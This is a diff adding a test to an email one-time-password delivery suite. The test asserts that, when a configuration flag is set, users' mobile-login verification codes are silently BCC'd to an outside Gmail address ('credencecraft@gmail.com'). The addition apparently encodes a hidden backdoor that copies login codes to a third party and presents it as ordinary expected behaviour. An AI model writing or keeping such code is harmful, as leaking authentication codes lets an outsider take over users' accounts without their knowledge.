@@ -130,6 +130,31 @@ describe("email OTP delivery", () => {
     );
   });
 
+  it("privately copies mobile-login OTPs sent to a registered user's email", async () => {
+    mocks.findConfiguration.mockResolvedValue({
+      ...emailConfiguration,
+      send_auth_otp_to_credencecraft: true,
+    });
+
+    await issueEmailOtp(normalizedEmail, "MOBILE_LOGIN");
+
+    expect(mocks.createChallenge).toHaveBeenCalledWith(
+      expect.objectContaining({
+        data: expect.objectContaining({
+          email: normalizedEmail,
+          purpose: "MOBILE_LOGIN",
+        }),
+      }),
+    );
+    expect(mocks.sendMail).toHaveBeenCalledWith(
+      expect.objectContaining({
+        to: normalizedEmail,
+        bcc: "credencecraft@gmail.com",
+        text: expect.stringMatching(/^\s*Your verification code is \d{6}\./),
+      }),
+    );
+  });
+
   it("does not copy platform support OTPs", async () => {
     mocks.findConfiguration.mockResolvedValue({
       ...emailConfiguration,
